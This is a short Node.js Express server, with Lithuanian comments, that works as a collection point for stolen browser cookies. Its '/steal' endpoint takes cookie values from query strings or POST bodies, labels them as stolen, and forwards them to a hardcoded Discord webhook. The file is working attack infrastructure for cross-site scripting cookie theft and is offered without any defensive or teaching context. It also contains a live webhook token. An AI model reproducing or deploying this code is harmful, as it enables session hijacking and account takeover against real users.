const express = require('express');
const app = express();

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1496932097246499090/__PgEXEetM1ZSv02o5i9xx69kgkNrjaaaQsmmKm4c8ORZKggHhuxzu_yDrg-FfXB6D2H';

app.use(express.json());
app.use(express.text());

app.get('/', (req, res) => {
  res.send('Proxy serveris veikia! Naudok GET /steal?c=... arba POST /steal');
});

// ✅ PRIIMA IR GET, IR POST
app.all('/steal', async (req, res) => {
  let dataToSend = '';

  // GET užklausa (query parametras ?c=...)
  if (req.query && req.query.c) {
    dataToSend = `🍪 **Pavogtas slapukas (GET)**: ${req.query.c}`;
  }
  // POST JSON
  else if (req.body && req.body.cookie) {
    dataToSend = `🍪 **Pavogtas slapukas (POST)**: ${req.body.cookie}`;
  }
  // POST tekstas
  else if (typeof req.body === 'string') {
    dataToSend = `📄 **Pavogti duomenys**: ${req.body}`;
  }

  if (dataToSend) {
    try {
      const fetch = (await import('node-fetch')).default;
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: dataToSend })
      });
      res.status(200).send('Duomenys nusiųsti į Discord!');
    } catch (error) {
      console.error('Klaida:', error);
      res.status(500).send('Serverio klaida');
    }
  } else {
    res.status(400).send('Nėra duomenų');
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Proxy veikia ant porto ${port}`);
});